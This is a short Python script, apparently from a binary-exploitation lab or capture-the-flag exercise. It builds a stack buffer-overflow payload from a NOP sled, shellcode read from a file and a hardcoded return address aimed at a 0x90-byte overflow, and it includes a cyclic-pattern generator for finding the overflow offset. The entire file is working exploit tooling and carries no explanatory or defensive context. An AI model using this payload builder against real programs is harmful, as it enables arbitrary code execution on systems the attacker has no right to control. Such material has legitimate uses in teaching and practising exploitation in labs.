#!/usr/bin/env python3

def generate_shellcode(desired_length):
    jmp_address = int.to_bytes(0x7fffffffe3f9, 8, 'little')
    with open("shellcode.bin", "rb") as f:
        shellcode = f.read()
    print(f"jmp_address: {jmp_address}")
    print(f"shellcode length: {len(shellcode)}")
    padding_length = desired_length - len(shellcode) - len(jmp_address)
    padding = b"\x90" * padding_length
    print(f"padding length:   {len(padding)}")
    payload = padding+shellcode+jmp_address
    print(f"payload length:   {len(payload)}")
    return payload


def generate_sentinel(desired_length):
    string = b"ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    sentinel = []
    for c1 in string:
        for c2 in string[4:]:
            for c3 in string[8:]:
                for c4 in string[12:]:
                    if len(sentinel) >= desired_length:
                        sentinel = b''.join([
                            x.to_bytes(1, 'little') for x in
                            sentinel[:desired_length]
                        ])
                        print(f"sentinel: {sentinel}")
                        return sentinel
                    else:
                        sentinel.extend([c1, c2, c3, c4])


if __name__ == "__main__":
    payload = generate_shellcode(0x88+8)
    with open("payload.bin", "wb") as f:
        f.write(payload)
